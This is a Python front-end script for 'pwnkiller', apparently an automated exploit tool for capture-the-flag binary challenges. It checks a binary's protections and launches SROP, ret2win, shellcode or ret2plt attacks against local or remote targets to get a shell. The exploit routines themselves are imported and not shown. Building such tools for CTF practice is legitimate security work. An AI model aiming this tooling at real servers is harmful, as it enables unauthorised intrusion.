#!/usr/bin/python3
from pwnkiller import *

class pwnkiller():
    def __init__(self,argv):
        banner()
        parser = argparse.ArgumentParser(description="Pwnkiller goes bruhhhhh...")
        parser.add_argument('-b','--binary',type=str,metavar='',required=True,help="binary file")
        parser.add_argument('-of','--offset',type=int,metavar='',help="manually specify offset to the return address")
        parser.add_argument('-ip','--IPaddress',type=str,metavar='',help="IP of the remote server")
        parser.add_argument('-p','--port',type=int,metavar='',help="Port of the remote server")
        parser.add_argument('-exp','--exploit',type=str,metavar='',help="Specify the exploitation technique")
        parser.add_argument('-win','--winaddr',type=str,metavar='',help="Win address")
        args = parser.parse_args()

        binary = args.binary
        user_offset = args.offset
        remote_server = args.IPaddress
        remote_port = args.port
        exp_tech = args.exploit
        if args.winaddr:
            win_addr = int(args.winaddr,16)

        # getting basic info about the binary
        is_relro,is_canary,is_nx,is_pie,can_execute_shellcode,is_packed,is_x86_64,is_static,is_stripped = analysis.static(binary)

        # what the binary does
        theres_a_pie_leak,theres_a_libc_leak,theres_a_canary_leak,theres_a_stack_leak,may_be_a_while_loop = analysis.dynamic(binary)

# specify the exploit
        if exp_tech:
            if 'rop' in exp_tech.lower():
                if user_offset:
                    offset_RIP = int(user_offset)
                else:
                    offset_RIP = offset.normal(binary)
                    context.log_level = "INFO"
                    log.info(f"RIP at {offset_RIP}")

                if remote_server and remote_port:
                    exploit.srop(binary,offset_RIP,remote_server,remote_port)
                else:
                    exploit.srop(binary,offset_RIP)
                exit()

            elif 'ret2win' in exp_tech.lower():
                if user_offset:
                    offset_RIP = int(user_offset)
                else:
                    offset_RIP = offset.normal(binary)
                    context.log_level = "INFO"
                    log.info(f"RIP at {offset_RIP}")

                if remote_server and remote_port:
                    exploit.ret2win(binary,offset_RIP,win_addr,remote_server,remote_port)
                else:
                    exploit.ret2win(binary,offset_RIP,win_addr)
                exit()

            elif 'leak+sc' in exp_tech.lower():
                if user_offset:
                    offset_RIP = int(user_offset)
                else:
                    offset_RIP = offset.normal(binary)
                    context.log_level = "INFO"
                    log.info(f"RIP at {offset_RIP}")
                if remote_server and remote_port:
                    exploit.leak_shellcode(binary,offset_RIP,remote_server,remote_port)
                else:
                    exploit.leak_shellcode(binary,offset_RIP)
                exit()


        # finding offset
        if may_be_a_while_loop == False:
            if is_canary == False:
                if user_offset:
                    offset_RIP = int(user_offset)
                else:
                    offset_RIP = offset.normal(binary)
                    context.log_level = "INFO"
                    log.info(f"RIP at {offset_RIP}")
            else:
                if user_offset:
                    offset_CANARY = int(user_offset)-16
                    offset_RIP = int(user_offset)
                else:
                    offset_CANARY = offset.with_canary(binary)
                    offset_RIP = offset_CANARY + 16
                    context.log_level = "INFO"
                    log.info(f"CANARY at {offset_CANARY}")
                    log.info(f"RIP at {offset_RIP}")

            ### exploits
            # do ret2plt
            if is_canary == False and is_pie == False and is_stripped == False and is_static == False:
                exploit.ret2plt_local(binary,offset_RIP)
                confirm_shell = input("GOT shell? [Y/N]").lower()
                if 'y' in confirm_shell:
                    # check remote arguments
                    if remote_server and remote_port:
                        exploit.ret2plt_remote(binary,offset_RIP,remote_server,remote_port)
                    else:
                        context.log_level = "INFO"
                        log.info("Specify remote ip and port in arguments")
                        exit()
                else:
                    context.log_level = "INFO"
                    log.info("Try other exploits")
                    exit()


if __name__ == "__main__":
    pwnkiller(sys.argv)

'''
--[TODO]--

- format string (finds `flag{s0m3_1337_fL4G}` that hidden in stack)
- format string + ret2libc
- ret2dlresolve
- ret2csu
'''
